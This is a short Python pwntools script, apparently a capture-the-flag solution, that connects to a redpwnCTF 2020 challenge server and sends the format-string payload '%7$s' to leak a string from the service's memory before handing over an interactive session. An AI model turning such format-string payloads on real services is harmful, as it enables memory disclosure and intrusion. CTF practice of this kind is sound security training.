from pwn import *

r = remote("2020.redpwnc.tf", 31826)

payload =  "%7$s"

r.sendline(payload)
r.interactive()
